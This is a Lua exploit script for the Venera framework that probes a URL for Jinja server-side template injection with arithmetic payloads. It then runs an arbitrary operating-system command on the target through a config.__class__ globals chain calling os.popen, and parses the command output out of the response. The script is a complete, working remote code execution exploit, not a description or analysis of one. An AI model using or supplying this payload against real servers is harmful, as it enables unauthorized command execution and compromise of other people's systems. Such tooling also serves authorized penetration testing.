--[[
    Script for Venera Framework
    https://github.com/farinap5/Venera
]]--
local http = require("http")
local client = http.client()

-- Metadata
METADATA = {
    AUTHOR = {"farinap5 <null>"},
    VERSION = "1.0",
    TAGS = {"ssti","http","generic","exploit","get","rce","jinja"},
    INFO = [[Simple Sever Side Template Injection (ssti) to test and exploit Jinja template engine.
This poc works only for GET method.

PoC:  
- http://example.com/?search={{7*7}}

TODO: fix url encoding
]]
}

-- Arguments/Variables needed to execute script
VARS = {
    URL = {VALUE="http://example.com", NEEDED="yes", DESCRIPT="The entire URL with '*' where to replace for the payload."},
    VERBOSE = {VALUE="false", NEEDED="no", DESCRIPT="Verbose output."},
    CMD = {VALUE="id", NEEDED="no", DESCRIPT="Code to run remotely on target."}
}

function Init()
    Meta(METADATA) -- Load metadata 
    LoadVars(VARS) -- Load variables
end

function Main()
    if validate() == true then
        PrintSuccsln("Target seems to be vulnerable.")
    else
        PrintErrln("Target doesn't look vulnerable.")
        return
    end
    
    PrintInfoln("Exploiting...")
    if exploit() == false then -- exploit main func
        PrintErrln("Error.")
    end

end

function exploit()
    local target = VARS.URL.VALUE
    local exp = "{{config.__class__.__init__.__globals__['os'].popen('"..VARS.CMD.VALUE.."').read()}}"
    local n = RandomString(8,"0-9")
    local lim = "{{"..n.."}}"
    local payload = lim..exp..lim
    local patt = n.."(.*)"..n -- pattern to find the data inside html code

    dbgg("Set payload "..payload)

    --local scp = http.query_escape(payload)
    -- print(scp)
    local inj = target:gsub("*",payload)
    
    --print(inj)
    local r1 = http.request("GET", inj)
    local resp, err = client:do_request(r1)
    if err then
        error(err)
        return false
    end

    if resp.code == 403 then
        PrintErrln("Status code 403. WAF dropped request.")
        return false
    end
    if resp.code ~= 200 then
        PrintErrln("Error. Validate manually or try again.")
        return false
    end

    if not (resp.body:find(n)) then
        dbgg(n.." not found.")
        return false
    end
    
    print("\n")
    for i in resp.body:gmatch(patt) do
        print(i)
    end

    return true
end

function validate()
    local target = VARS.URL.VALUE
    local p1 = "{{7*7}}" -- most generic test possible

    local n1 = RandomString(2,"0-9")
    local n2 = RandomString(2,"0-9")
    local p2 = "{{"..n1.."*"..n2.."}}"

    -- Test 1
    local inj = target:gsub("*",p1)
    dbgg("Set payload "..inj)
    dbgg("Requesting "..inj)
    local r1 = http.request("GET", inj)
    local resp, err = client:do_request(r1)
    if err then error(err); return false end
    dbgg("Returned code: "..resp.code)

    if resp.code == 403 then
        PrintErrln("Status code 403. WAF dropped request.")
        return false
    end
    if resp.code ~= 200 then
        PrintErrln("Error. Validate manually.")
        return false
    end
    
    if resp.body:find("49") then
        dbgg("49 found.")
    else
        dbgg("49 not found.")
        return false
    end

    -- Test 2
    inj = target:gsub("*",p2)
    dbgg("Set random payload "..inj)
    dbgg("Requesting "..inj)
    r1 = http.request("GET", inj)
    local resp, err = client:do_request(r1)
    if err then error(err); return false end
    dbgg("Returned code: "..resp.code)

    local vld = tostring(tonumber(n1)*tonumber(n2)) -- convert rand numbs to int and return as str.

    if resp.code == 403 then
        PrintErrln("Status code 403. WAF dropped request.")
        return false
    end
    if resp.code ~= 200 then
        PrintErrln("Error. Validate manually.")
        return false
    end

    if resp.body:find(vld) then
        dbgg(vld.." found.")
    else
        dbgg(vld.." not found.")
        return false
    end

    return true
end


function dbgg(msg)
    if VARS.VERBOSE.VALUE == "true" then
        PrintInfoln(msg)
    end
end